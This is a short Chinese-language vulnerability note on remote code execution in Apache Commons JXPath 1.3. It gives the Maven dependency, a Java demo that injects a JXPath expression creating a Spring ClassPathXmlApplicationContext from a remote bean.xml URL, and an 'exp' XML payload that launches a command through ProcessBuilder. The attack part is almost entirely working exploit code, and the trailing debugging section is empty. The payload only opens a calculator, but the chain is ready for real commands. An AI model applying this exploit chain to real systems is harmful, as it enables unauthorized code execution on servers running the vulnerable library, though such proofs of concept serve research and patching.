## 漏洞环境

目前影响到1.3

maven
```xml
<!-- https://mvnrepository.com/artifact/commons-jxpath/commons-jxpath -->
<dependency>
    <groupId>commons-jxpath</groupId>
    <artifactId>commons-jxpath</artifactId>
    <version>1.3</version>
</dependency>
```

demo
```java
package com.jxpath.demo;  
  
import org.apache.commons.jxpath.JXPathContext;  
  
public class demo {  
    public static void main(String[] args) {  
        try {  
            JXPathContext context = JXPathContext.newContext((Object)null);  
            String key = (String) context.getValue("org.springframework.context.support.ClassPathXmlApplicationContext.new(\"http://127.0.0.1:8000/bean.xml\")");  
            System.out.println(key);  
        } catch (Exception e){  
            System.out.println(e);  
        }  
    }  
}
```

exp
```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:p="http://www.springframework.org/schema/p"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
<!--    普通方式创建类-->
   <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value>calc.exe</value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```


## 调试
